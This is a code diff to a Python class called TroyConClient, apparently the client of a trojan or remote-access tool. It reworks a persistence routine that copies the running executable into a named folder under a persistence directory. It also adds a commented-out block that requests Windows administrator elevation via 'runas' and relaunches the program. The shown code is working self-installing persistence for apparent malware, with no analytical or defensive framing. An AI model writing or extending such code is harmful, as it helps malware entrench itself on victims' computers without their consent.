@@ -167,16 +167,40 @@ class TroyConClient:
                 #     print("[*] dest_dir already exists. No admin elevation needed.")
                 # -----------------------------------------------------------------
 
-                #Path setup for copying the currently running file (current_exe_path) into the Persistence directory.
-                persistence_target_path = os.path.join(self.persistence_dir, 'troycon.py') # Don't use after converting to an EXE file.
+                # Path setup for copying the currently running file (current_exe_path) into the Persistence directory.
+                exe_filename  = os.path.basename(current_exe_path)
+                no_exe_name = os.path.splitext(exe_filename)[0]
+                dest_folder = os.path.join(self.persistence_dir, no_exe_name)
+                persistence_target_path = os.path.join(dest_folder, exe_filename)
+
+                if not os.path.exists(dest_folder):
+                    os.makedirs(dest_folder, exist_ok=True)
 
                 # Option A (commented out): Use shutil.copy2 to copy the file while preserving metadata (e.g., timestamps).
                 # Option B (active code): Manually copy the file in binary mode.
                 # Use either method depending on your needs.
                 if not os.path.exists(persistence_target_path):
-                    # if current_exe_path != persistence_target_path:
+                    # if you need admin rights to copy the file, uncomment below
+                    # try:
+                    #     is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+                    # except:
+                    #     is_admin = False
+
+                    # if not is_admin:
+                    #     print("[*] Administrator privileges required. Requesting elevation...")
+
+                    #     params = " ".join([f'"{arg}"' for arg in sys.argv])
+                    #     ctypes.windll.shell32.ShellExecuteW(
+                    #         None, "runas", sys.executable, params, None, 1
+                    #     )
+                    #     sys.exit()
+                    
+                    # try:
                     #     shutil.copy2(current_exe_path, persistence_target_path)
                     #     print(f"[Persistence] Copied to '{persistence_target_path}' (Timestamp preserved).")
+                    # except Exception as e:
+                    #     print(f"[Error] Failed to copy directory: {e}")
+
                     with open(current_exe_path, 'rb') as src_file, \
                         open(persistence_target_path, 'wb') as dst_file:
                         dst_file.write(src_file.read())
